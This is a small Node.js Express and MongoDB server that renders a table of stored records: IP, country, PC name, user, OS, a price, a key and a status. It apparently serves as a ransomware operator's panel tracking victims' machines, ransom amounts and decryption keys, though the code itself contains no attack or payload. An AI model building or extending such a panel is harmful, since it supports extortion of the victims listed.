'use strict';
const express = require('express');
const path = require('path');
const app = express();
const mongoose = require("mongoose");
const Schema = mongoose.Schema;

const userScheme = new Schema({

    ID: String,
    IP: String,
    Country: String,
    Flag: String,
    PC: String,
    User: String,
    OS: String,
    TimeZone: String,
    DateTime: String,
    Price: String,
    Key: String,
    Status: String

}, { versionKey: false });

mongoose.connect("mongodb://localhost:27017/usersdb", { useUnifiedTopology: true, useNewUrlParser: true, useFindAndModify: false }, function (err) {

    if (err) {
        return console.log(err)
    }

    app.listen(3000);
});

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (_req, res) {

    const Users = mongoose.model("Users", userScheme);
    const dataUser = new Set();

    Users.find({}, { _id: false }, function (err, docs) {

        if (err) {
            return console.log(err);
        }

        for (var dataJSON of docs) {

            var dataObject = {

                ID: dataJSON.ID,
                IP: dataJSON.IP,
                Country: dataJSON.Country,
                Flag: dataJSON.Flag,
                PC: dataJSON.PC,
                User: dataJSON.User,
                OS: dataJSON.OS,
                TimeZone: dataJSON.TimeZone,
                DateTime: dataJSON.DateTime,
                Price: dataJSON.Price,
                Key: dataJSON.Key,
                Status: dataJSON.Status
            };

            dataUser.add(dataObject);
        }

        res.render('index', { data: Array.from(dataUser).reverse() });
    });
});